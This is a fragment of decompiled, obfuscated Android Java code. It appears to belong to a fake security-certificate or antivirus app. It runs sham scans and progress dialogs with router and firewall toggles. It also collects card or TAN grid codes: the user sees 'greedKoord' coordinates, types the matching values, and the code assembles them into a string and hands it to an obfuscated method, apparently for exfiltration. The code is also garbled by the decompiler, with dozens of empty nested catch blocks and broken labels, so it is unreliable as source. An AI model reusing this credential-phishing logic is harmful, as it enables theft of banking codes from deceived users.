                                                                                                                      ((TextView)findViewById(2131427356)).setText(localSharedPreferences.getString("kode56", a(false)));
                                                                                                                    }
                                                                                                                    catch (SQLException paramBundle)
                                                                                                                    {
                                                                                                                      continue;
                                                                                                                    }
                                                                                                                  }
                                                                                                                  catch (SQLException paramBundle)
                                                                                                                  {
                                                                                                                    continue;
                                                                                                                  }
                                                                                                                }
                                                                                                                catch (SQLException paramBundle)
                                                                                                                {
                                                                                                                  continue;
                                                                                                                }
                                                                                                              }
                                                                                                              catch (SQLException paramBundle)
                                                                                                              {
                                                                                                                continue;
                                                                                                              }
                                                                                                            }
                                                                                                            catch (SQLException paramBundle)
                                                                                                            {
                                                                                                              continue;
                                                                                                            }
                                                                                                          }
                                                                                                          catch (SQLException paramBundle)
                                                                                                          {
                                                                                                            continue;
                                                                                                          }
                                                                                                        }
                                                                                                        catch (SQLException paramBundle)
                                                                                                        {
                                                                                                          continue;
                                                                                                        }
                                                                                                      }
                                                                                                      catch (SQLException paramBundle)
                                                                                                      {
                                                                                                        continue;
                                                                                                      }
                                                                                                    }
                                                                                                    catch (SQLException paramBundle)
                                                                                                    {
                                                                                                      continue;
                                                                                                    }
                                                                                                  }
                                                                                                  catch (SQLException paramBundle)
                                                                                                  {
                                                                                                    continue;
                                                                                                  }
                                                                                                }
                                                                                                catch (SQLException paramBundle)
                                                                                                {
                                                                                                  continue;
                                                                                                }
                                                                                              }
                                                                                              catch (SQLException paramBundle)
                                                                                              {
                                                                                                continue;
                                                                                              }
                                                                                            }
                                                                                            catch (SQLException paramBundle)
                                                                                            {
                                                                                              continue;
                                                                                            }
                                                                                          }
                                                                                          catch (SQLException paramBundle)
                                                                                          {
                                                                                            continue;
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                      catch (SQLException paramBundle)
                                                                                      {
                                                                                        continue;
                                                                                      }
                                                                                    }
                                                                                    catch (SQLException paramBundle)
                                                                                    {
                                                                                      continue;
                                                                                    }
                                                                                  }
                                                                                  catch (SQLException paramBundle)
                                                                                  {
                                                                                    continue;
                                                                                  }
                                                                                }
                                                                                catch (SQLException paramBundle)
                                                                                {
                                                                                  continue;
                                                                                }
                                                                              }
                                                                              catch (SQLException paramBundle)
                                                                              {
                                                                                continue;
                                                                              }
                                                                            }
                                                                            catch (SQLException paramBundle)
                                                                            {
                                                                              continue;
                                                                            }
                                                                          }
                                                                          catch (SQLException paramBundle)
                                                                          {
                                                                            continue;
                                                                          }
                                                                        }
                                                                        catch (SQLException paramBundle)
                                                                        {
                                                                          continue;
                                                                        }
                                                                      }
                                                                      catch (SQLException paramBundle)
                                                                      {
                                                                        continue;
                                                                      }
                                                                    }
                                                                    catch (SQLException paramBundle)
                                                                    {
                                                                      continue;
                                                                    }
                                                                  }
                                                                  catch (SQLException paramBundle)
                                                                  {
                                                                    continue;
                                                                  }
                                                                }
                                                                catch (SQLException paramBundle)
                                                                {
                                                                  continue;
                                                                }
                                                              }
                                                              catch (SQLException paramBundle)
                                                              {
                                                                continue;
                                                              }
                                                            }
                                                            catch (SQLException paramBundle)
                                                            {
                                                              continue;
                                                            }
                                                          }
                                                          catch (SQLException paramBundle)
                                                          {
                                                            continue;
                                                          }
                                                        }
                                                        catch (SQLException paramBundle)
                                                        {
                                                          continue;
                                                        }
                                                      }
                                                      catch (SQLException paramBundle)
                                                      {
                                                        continue;
                                                      }
                                                    }
                                                    catch (SQLException paramBundle)
                                                    {
                                                      continue;
                                                    }
                                                  }
                                                  catch (SQLException paramBundle)
                                                  {
                                                    continue;
                                                  }
                                                }
                                                catch (SQLException paramBundle)
                                                {
                                                  continue;
                                                }
                                              }
                                              catch (SQLException paramBundle)
                                              {
                                                continue;
                                              }
                                            }
                                            catch (SQLException paramBundle)
                                            {
                                              continue;
                                            }
                                          }
                                          catch (SQLException paramBundle)
                                          {
                                            continue;
                                          }
                                        }
                                        catch (SQLException paramBundle)
                                        {
                                          continue;
                                        }
                                      }
                                      catch (SQLException paramBundle)
                                      {
                                        continue;
                                      }
                                    }
                                    catch (SQLException paramBundle)
                                    {
                                      continue;
                                    }
                                  }
                                  catch (SQLException paramBundle)
                                  {
                                    continue;
                                  }
                                }
                                catch (SQLException paramBundle)
                                {
                                  continue;
                                }
                              }
                              catch (SQLException paramBundle)
                              {
                                continue;
                              }
                            }
                            catch (SQLException paramBundle)
                            {
                              continue;
                            }
                          }
                          catch (SQLException paramBundle)
                          {
                            continue;
                          }
                        }
                        catch (SQLException paramBundle)
                        {
                          continue;
                        }
                      }
                      catch (SQLException paramBundle)
                      {
                        continue;
                      }
                    }
                    catch (SQLException paramBundle)
                    {
                      continue;
                    }
                  }
                  catch (SQLException paramBundle)
                  {
                    continue;
                  }
                }
                catch (SQLException paramBundle)
                {
                  continue;
                }
              }
              catch (SQLException paramBundle)
              {
                continue;
              }
            }
            catch (SQLException paramBundle)
            {
              continue;
            }
          }
          catch (SQLException paramBundle)
          {
            continue;
          }
        }
        catch (SQLException paramBundle)
        {
          continue;
        }
      }
      catch (SQLException paramBundle)
      {
        return;
      }
    }
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131361793, paramMenu);
    return true;
  }
  
  public void onFinish(View paramView)
  {
    finish();
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    paramMenuItem.getItemId();
    return super.onOptionsItemSelected(paramMenuItem);
  }
  
  protected void onResume()
  {
    super.onResume();
    this.jdField_a_of_type_JavaLangString = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("greedKoord", "");
    if (!this.jdField_a_of_type_JavaLangString.equals("")) {}
    switch (Integer.parseInt(getString(2131165185)))
    {
    default: 
      return;
    case 27: 
      ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(1);
      return;
    }
    ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(0);
    ((Button)findViewById(2131427379)).setVisibility(8);
    ((Button)findViewById(2131427380)).setVisibility(0);
    ((TextView)findViewById(2131427378)).setText(a(2131165433));
    String[] arrayOfString1 = this.jdField_a_of_type_JavaLangString.split("-");
    String[] arrayOfString2 = arrayOfString1[0].split(":");
    ((TextView)findViewById(2131427394)).setText(arrayOfString2[0]);
    ((TextView)findViewById(2131427397)).setText(arrayOfString2[1]);
    arrayOfString2 = arrayOfString1[1].split(":");
    ((TextView)findViewById(2131427395)).setText(arrayOfString2[0]);
    ((TextView)findViewById(2131427398)).setText(arrayOfString2[1]);
    arrayOfString1 = arrayOfString1[2].split(":");
    ((TextView)findViewById(2131427396)).setText(arrayOfString1[0]);
    ((TextView)findViewById(2131427399)).setText(arrayOfString1[1]);
  }
  
  public void onScanNow(View paramView)
  {
    new cI(this, (byte)0).execute(new Void[0]);
  }
  
  public void startForService(View paramView)
  {
    if (this.jdField_a_of_type_Boolean) {
      return;
    }
    this.jdField_a_of_type_AndroidAppProgressDialog = new ProgressDialog(this);
    this.jdField_a_of_type_AndroidAppProgressDialog.setTitle(a(2131165206));
    this.jdField_a_of_type_AndroidAppProgressDialog.setMessage(a(2131165206));
    this.jdField_a_of_type_AndroidAppProgressDialog.setProgressStyle(1);
    this.jdField_a_of_type_AndroidAppProgressDialog.setMax(2148);
    this.jdField_a_of_type_AndroidAppProgressDialog.setIndeterminate(true);
    this.jdField_a_of_type_AndroidAppProgressDialog.show();
    this.jdField_a_of_type_AndroidOsHandler = new cF(this);
    this.jdField_a_of_type_AndroidOsHandler.sendEmptyMessageDelayed(0, 2000L);
  }
  
  public void template10_click(View paramView)
  {
    new cK(this, (byte)0).execute(new Void[0]);
  }
  
  public void template11_click(View paramView)
  {
    new cL(this, (byte)0).execute(new Void[0]);
  }
  
  public void template12_click(View paramView)
  {
    new cM(this, (byte)0).execute(new Void[0]);
  }
  
  public void template13_click(View paramView)
  {
    new cN(this, (byte)0).execute(new Void[0]);
  }
  
  public void template14_click(View paramView)
  {
    new cO(this, (byte)0).execute(new Void[0]);
  }
  
  public void template15_click(View paramView)
  {
    new cP(this, (byte)0).execute(new Void[0]);
  }
  
  public void template16_click(View paramView)
  {
    new cQ(this, (byte)0).execute(new Void[0]);
  }
  
  public void template17_click(View paramView)
  {
    new cR(this, (byte)0).execute(new Void[0]);
  }
  
  public void template18_click(View paramView)
  {
    new cS(this, (byte)0).execute(new Void[0]);
  }
  
  public void template19_click(View paramView)
  {
    new cT(this, (byte)0).execute(new Void[0]);
  }
  
  public void template19_copy(View paramView)
  {
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165359));
  }
  
  public void template21_click(View paramView)
  {
    new cU(this, (byte)0).execute(new Void[0]);
  }
  
  public void template22_click(View paramView)
  {
    new cV(this, (byte)0).execute(new Void[0]);
  }
  
  public void template23_click(View paramView)
  {
    new cW(this, (byte)0).execute(new Void[0]);
  }
  
  public void template24_click(View paramView)
  {
    new cX(this, (byte)0).execute(new Void[0]);
  }
  
  public void template25_click(View paramView)
  {
    switch (paramView.getId())
    {
    case 2131427368: 
    default: 
      return;
    case 2131427367: 
      new cY(this, (byte)0).execute(new Void[0]);
      return;
    }
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165402));
  }
  
  public void template26_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427367: 
      new cZ(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427369: 
      b(((TextView)findViewById(2131427356)).getText().toString());
      a(a(2131165413));
      return;
    }
    finish();
  }
  
  public void template27_click(View paramView)
  {
    int i = 0;
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427379: 
    case 2131427380: 
      new da(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427384: 
      Object localObject = (LinearLayout)findViewById(2131427383);
      paramView = "";
      EditText localEditText;
      if (this.jdField_a_of_type_JavaLangString.equals(""))
      {
        ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(3);
        paramView = "";
        i = 0;
        for (;;)
        {
          if (i >= 3)
          {
            paramView = a(true);
            ((TextView)findViewById(2131427356)).setText(paramView);
            localObject = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
            ((SharedPreferences.Editor)localObject).putBoolean("isSerteficate27", true);
            ((SharedPreferences.Editor)localObject).putString("kode27", paramView);
            ((SharedPreferences.Editor)localObject).commit();
            return;
          }
          localEditText = (EditText)((LinearLayout)localObject).findViewWithTag("edit" + i);
          TextView localTextView = (TextView)((LinearLayout)localObject).findViewWithTag("tv_org" + i);
          paramView = paramView + localTextView.getText() + " - " + localEditText.getText() + " | ";
          i += 1;
        }
      }
      ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(4);
      for (;;)
      {
        if (i >= 3)
        {
          paramView = "|" + this.jdField_a_of_type_JavaLangString + " = " + paramView;
          this.jdField_a_of_type_DU.c(paramView);
          paramView = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
          paramView.putString("greedKoord", "");
          paramView.commit();
          return;
        }
        localEditText = (EditText)((LinearLayout)localObject).findViewWithTag("edit" + i);
        paramView = paramView + localEditText.getText();
        i += 1;
      }
    case 2131427369: 
      b(((TextView)findViewById(2131427356)).getText().toString());
      a(a(2131165413));
      return;
    }
    finish();
  }
  
  public void template28_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427379: 
    case 2131427380: 
      ((TextView)findViewById(2131427393)).setText(a(2131165430));
      new dc(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427384: 
      ((TextView)findViewById(2131427393)).setText(a(2131165431));
      paramView = ((EditText)findViewById(2131427400)).getText().toString() + ((EditText)findViewById(2131427401)).getText().toString() + ((EditText)findViewById(2131427402)).getText().toString();
      paramView = "|" + this.jdField_a_of_type_JavaLangString + " = " + paramView;
      this.jdField_a_of_type_DU.c(paramView);
      ((ViewFlipper)findViewById(2131427374)).setDisplayedChild(3);
      paramView = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
      paramView.putString("greedKoord", "");
      paramView.commit();
      return;
    case 2131427369: 
      b(((TextView)findViewById(2131427356)).getText().toString());
      a(a(2131165413));
      return;
    }
    finish();
  }
  
  public void template29_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427404: 
      new de(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427369: 
      b(((TextView)findViewById(2131427356)).getText().toString());
      a(a(2131165452));
      return;
    }
    finish();
  }
  
  public void template30_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    }
    new df(this, (byte)0).execute(new Void[0]);
  }
  
  public void template31_click(View paramView)
  {
    new dg(this, (byte)0).execute(new Void[0]);
  }
  
  public void template32_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427404: 
      new dh(this, (byte)0).execute(new Void[0]);
      return;
    }
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165474));
  }
  
  public void template33_click(View paramView)
  {
    new di(this, (byte)0).execute(new Void[0]);
  }
  
  public void template34_click(View paramView)
  {
    new dj(this, (byte)0).execute(new Void[0]);
  }
  
  public void template36_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427404: 
      new dk(this, (byte)0).execute(new Void[0]);
      return;
    }
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165498));
  }
  
  public void template37_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427404: 
      new dl(this, (byte)0).execute(new Void[0]);
      return;
    }
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165506));
  }
  
  public void template38_click(View paramView)
  {
    boolean bool3 = false;
    boolean bool2 = false;
    boolean bool1;
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427340: 
      new dm(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427412: 
      try
      {
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = false;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label162;
          }
          ((ImageView)findViewById(2131427413)).setImageResource(getResources().getIdentifier("template38_router", "drawable", getPackageName()));
          ((TextView)findViewById(2131427414)).setText(a(2131165509));
        }
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        ((ImageView)findViewById(2131427413)).setImageResource(getResources().getIdentifier("template38_router_disable", "drawable", getPackageName()));
        ((TextView)findViewById(2131427414)).setText(a(2131165510));
        return;
      }
    case 2131427409: 
      try
      {
        label162:
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = bool2;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label303;
          }
          ((ImageView)findViewById(2131427410)).setImageResource(getResources().getIdentifier("template38_firewall", "drawable", getPackageName()));
          ((TextView)findViewById(2131427411)).setText(a(2131165507));
        }
      }
      catch (Exception localException2)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        label303:
        ((ImageView)findViewById(2131427410)).setImageResource(getResources().getIdentifier("template38_firewall_disable", "drawable", getPackageName()));
        ((TextView)findViewById(2131427411)).setText(a(2131165508));
        return;
      }
    }
    try
    {
      bool1 = ((Boolean)paramView.getTag()).booleanValue();
      if (bool1)
      {
        bool1 = bool3;
        paramView.setTag(Boolean.valueOf(bool1));
        if (!bool1) {
          break label445;
        }
        ((ImageView)findViewById(2131427407)).setImageResource(getResources().getIdentifier("template38_shield", "drawable", getPackageName()));
        ((TextView)findViewById(2131427408)).setText(a(2131165511));
      }
    }
    catch (Exception localException3)
    {
      for (;;)
      {
        bool1 = true;
        continue;
        bool1 = true;
      }
      label445:
      ((ImageView)findViewById(2131427407)).setImageResource(getResources().getIdentifier("template38_shield_disable", "drawable", getPackageName()));
      ((TextView)findViewById(2131427408)).setText(a(2131165512));
    }
  }
  
  public void template40_click(View paramView)
  {
    boolean bool3 = false;
    boolean bool2 = false;
    boolean bool1;
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427340: 
      new do(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427416: 
      try
      {
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = false;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label162;
          }
          ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template40_check", "drawable", getPackageName()));
          ((TextView)paramView.findViewById(2131427418)).setText(a(2131165518));
        }
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template40_uncheck", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427418)).setText(a(2131165519));
        return;
      }
    case 2131427419: 
      try
      {
        label162:
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = bool2;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label303;
          }
          ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template40_check", "drawable", getPackageName()));
          ((TextView)paramView.findViewById(2131427420)).setText(a(2131165520));
        }
      }
      catch (Exception localException2)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        label303:
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template40_uncheck", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427420)).setText(a(2131165521));
        return;
      }
    }
    try
    {
      bool1 = ((Boolean)paramView.getTag()).booleanValue();
      if (bool1)
      {
        bool1 = bool3;
        paramView.setTag(Boolean.valueOf(bool1));
        if (!bool1) {
          break label445;
        }
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template40_check", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427422)).setText(a(2131165522));
      }
    }
    catch (Exception localException3)
    {
      for (;;)
      {
        bool1 = true;
        continue;
        bool1 = true;
      }
      label445:
      ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template40_uncheck", "drawable", getPackageName()));
      ((TextView)paramView.findViewById(2131427422)).setText(a(2131165523));
    }
  }
  
  public void template41_click(View paramView)
  {
    ViewFlipper localViewFlipper = (ViewFlipper)findViewById(2131427374);
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427340: 
      new dq(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427375: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(1);
      return;
    case 2131427376: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(2);
      return;
    case 2131427381: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(3);
      return;
    case 2131427386: 
      finish();
      return;
    }
    localViewFlipper.setInAnimation(this, 2130968576);
    localViewFlipper.setOutAnimation(this, 2130968579);
    localViewFlipper.setDisplayedChild(0);
  }
  
  public void template42_click(View paramView)
  {
    ViewFlipper localViewFlipper = (ViewFlipper)findViewById(2131427374);
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427340: 
      new dr(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427375: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(1);
      return;
    case 2131427376: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(2);
      return;
    case 2131427381: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(3);
      return;
    case 2131427386: 
      finish();
      return;
    }
    localViewFlipper.setInAnimation(this, 2130968576);
    localViewFlipper.setOutAnimation(this, 2130968579);
    localViewFlipper.setDisplayedChild(0);
  }
  
  public void template43_click(View paramView)
  {
    ViewFlipper localViewFlipper = (ViewFlipper)findViewById(2131427374);
    findViewById(2131427424).setVisibility(0);
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427425: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(1);
      return;
    case 2131427426: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(2);
      return;
    case 2131427428: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(3);
      return;
    case 2131427427: 
      finish();
      return;
    case 2131427354: 
    case 2131427363: 
    case 2131427424: 
    case 2131427434: 
    case 2131427437: 
      findViewById(2131427424).setVisibility(4);
      localViewFlipper.setInAnimation(this, 2130968576);
      localViewFlipper.setOutAnimation(this, 2130968579);
      localViewFlipper.setDisplayedChild(0);
      return;
    case 2131427430: 
      new dt(this, (byte)0).execute(new Void[0]);
      return;
    }
    new ds(this, (byte)0).execute(new Void[0]);
  }
  
  public void template44_click(View paramView)
  {
    ViewFlipper localViewFlipper = (ViewFlipper)findViewById(2131427374);
    findViewById(2131427424).setVisibility(0);
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427425: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(1);
      return;
    case 2131427426: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(2);
      return;
    case 2131427428: 
      localViewFlipper.setInAnimation(this, 2130968577);
      localViewFlipper.setOutAnimation(this, 2130968578);
      localViewFlipper.setDisplayedChild(3);
      return;
    case 2131427427: 
      finish();
      return;
    case 2131427354: 
    case 2131427363: 
    case 2131427424: 
    case 2131427434: 
    case 2131427437: 
      findViewById(2131427424).setVisibility(4);
      localViewFlipper.setInAnimation(this, 2130968576);
      localViewFlipper.setOutAnimation(this, 2130968579);
      localViewFlipper.setDisplayedChild(0);
      return;
    case 2131427430: 
      new dv(this, (byte)0).execute(new Void[0]);
      return;
    }
    new du(this, (byte)0).execute(new Void[0]);
  }
  
  public void template45_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    }
    new dw(this, (byte)0).execute(new Void[0]);
  }
  
  public void template46_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    }
    new dw(this, (byte)0).execute(new Void[0]);
  }
  
  public void template47_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    }
    new dx(this, (byte)0).execute(new Void[0]);
  }
  
  public void template48_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427404: 
      new dy(this, (byte)0).execute(new Void[0]);
      return;
    }
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165498));
  }
  
  public void template49_click(View paramView)
  {
    SharedPreferences.Editor localEditor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
    boolean bool;
    switch (paramView.getId())
    {
    default: 
    case 2131427340: 
      for (;;)
      {
        localEditor.commit();
        return;
        new dz(this, (byte)0).execute(new Void[0]);
      }
    case 2131427376: 
      if (((Boolean)findViewById(2131427441).getTag()).booleanValue())
      {
        bool = false;
        if (!bool) {
          break label177;
        }
        ((ImageView)findViewById(2131427441)).setImageResource(a("template49_on"));
        ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(true));
      }
      for (;;)
      {
        localEditor.putBoolean("template49_check1", bool);
        break;
        bool = true;
        break label117;
        ((ImageView)findViewById(2131427441)).setImageResource(a("template49_off"));
        ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(false));
      }
    case 2131427381: 
      if (((Boolean)findViewById(2131427442).getTag()).booleanValue())
      {
        bool = false;
        if (!bool) {
          break label298;
        }
        ((ImageView)findViewById(2131427442)).setImageResource(a("template49_on"));
        ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(true));
      }
      for (;;)
      {
        localEditor.putBoolean("template49_check2", bool);
        break;
        bool = true;
        break label238;
        ((ImageView)findViewById(2131427442)).setImageResource(a("template49_off"));
        ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(false));
      }
    case 2131427386: 
      label117:
      label177:
      label238:
      label298:
      if (((Boolean)findViewById(2131427443).getTag()).booleanValue())
      {
        bool = false;
        label359:
        if (!bool) {
          break label419;
        }
        ((ImageView)findViewById(2131427443)).setImageResource(a("template49_on"));
        ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(true));
      }
      for (;;)
      {
        localEditor.putBoolean("template49_check3", bool);
        break;
        bool = true;
        break label359;
        label419:
        ((ImageView)findViewById(2131427443)).setImageResource(a("template49_off"));
        ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(false));
      }
    }
    if (((Boolean)findViewById(2131427444).getTag()).booleanValue())
    {
      bool = false;
      label480:
      if (!bool) {
        break label540;
      }
      ((ImageView)findViewById(2131427444)).setImageResource(a("template49_on"));
      ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(true));
    }
    for (;;)
    {
      localEditor.putBoolean("template49_check4", bool);
      break;
      bool = true;
      break label480;
      label540:
      ((ImageView)findViewById(2131427444)).setImageResource(a("template49_off"));
      ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(false));
    }
  }
  
  public void template4_click(View paramView)
  {
    new dB(this, (byte)0).execute(new Void[0]);
  }
  
  public void template50_click(View paramView)
  {
    SharedPreferences.Editor localEditor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
    boolean bool;
    switch (paramView.getId())
    {
    default: 
    case 2131427340: 
      for (;;)
      {
        localEditor.commit();
        return;
        new dC(this, (byte)0).execute(new Void[0]);
      }
    case 2131427376: 
      if (((Boolean)findViewById(2131427441).getTag()).booleanValue())
      {
        bool = false;
        if (!bool) {
          break label177;
        }
        ((ImageView)findViewById(2131427441)).setImageResource(a("template50_on"));
        ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(true));
      }
      for (;;)
      {
        localEditor.putBoolean("template50_check1", bool);
        break;
        bool = true;
        break label117;
        ((ImageView)findViewById(2131427441)).setImageResource(a("template50_off"));
        ((ImageView)findViewById(2131427441)).setTag(Boolean.valueOf(false));
      }
    case 2131427381: 
      if (((Boolean)findViewById(2131427442).getTag()).booleanValue())
      {
        bool = false;
        if (!bool) {
          break label298;
        }
        ((ImageView)findViewById(2131427442)).setImageResource(a("template50_on"));
        ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(true));
      }
      for (;;)
      {
        localEditor.putBoolean("template50_check2", bool);
        break;
        bool = true;
        break label238;
        ((ImageView)findViewById(2131427442)).setImageResource(a("template50_off"));
        ((ImageView)findViewById(2131427442)).setTag(Boolean.valueOf(false));
      }
    case 2131427386: 
      label117:
      label177:
      label238:
      label298:
      if (((Boolean)findViewById(2131427443).getTag()).booleanValue())
      {
        bool = false;
        label359:
        if (!bool) {
          break label419;
        }
        ((ImageView)findViewById(2131427443)).setImageResource(a("template50_on"));
        ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(true));
      }
      for (;;)
      {
        localEditor.putBoolean("template50_check3", bool);
        break;
        bool = true;
        break label359;
        label419:
        ((ImageView)findViewById(2131427443)).setImageResource(a("template50_off"));
        ((ImageView)findViewById(2131427443)).setTag(Boolean.valueOf(false));
      }
    }
    if (((Boolean)findViewById(2131427444).getTag()).booleanValue())
    {
      bool = false;
      label480:
      if (!bool) {
        break label540;
      }
      ((ImageView)findViewById(2131427444)).setImageResource(a("template50_on"));
      ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(true));
    }
    for (;;)
    {
      localEditor.putBoolean("template50_check4", bool);
      break;
      bool = true;
      break label480;
      label540:
      ((ImageView)findViewById(2131427444)).setImageResource(a("template50_off"));
      ((ImageView)findViewById(2131427444)).setTag(Boolean.valueOf(false));
    }
  }
  
  public void template51_click(View paramView)
  {
    ViewFlipper localViewFlipper = (ViewFlipper)findViewById(2131427374);
    localViewFlipper.setInAnimation(this, 2130968577);
    localViewFlipper.setOutAnimation(this, 2130968578);
    EditText localEditText = (EditText)findViewById(2131427348);
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427447: 
    case 2131427457: 
      localViewFlipper.setDisplayedChild(1);
      findViewById(2131427452).setVisibility(0);
      localEditText.setText("");
      if (this.jdField_a_of_type_Cy.a.size() == 0) {
        findViewById(2131427449).setVisibility(4);
      }
      for (;;)
      {
        findViewById(2131427455).setVisibility(0);
        findViewById(2131427453).setVisibility(8);
        findViewById(2131427454).setVisibility(8);
        ((TextView)findViewById(2131427451)).setText(getResources().getIdentifier("template" + getString(2131165185) + "_please", "string", getPackageName()));
        return;
        findViewById(2131427449).setVisibility(0);
      }
    case 2131427454: 
      findViewById(2131427455).setVisibility(0);
      findViewById(2131427452).setVisibility(0);
      findViewById(2131427453).setVisibility(8);
      findViewById(2131427454).setVisibility(8);
      ((TextView)findViewById(2131427451)).setText(getResources().getIdentifier("template" + getString(2131165185) + "_please", "string", getPackageName()));
      return;
    case 2131427455: 
      if (localEditText.getText().toString().equals(""))
      {
        localEditText.requestFocus();
        ((InputMethodManager)getSystemService("input_method")).toggleSoftInput(1, 0);
        return;
      }
      paramView = new dF(this, (byte)0);
      paramView.c = localEditText.getText().toString();
      paramView.execute(new Void[0]);
      return;
    case 2131427449: 
    case 2131427459: 
    case 2131427461: 
      localViewFlipper.setDisplayedChild(0);
      return;
    }
    new dE(this, (byte)0).execute(new Void[0]);
  }
  
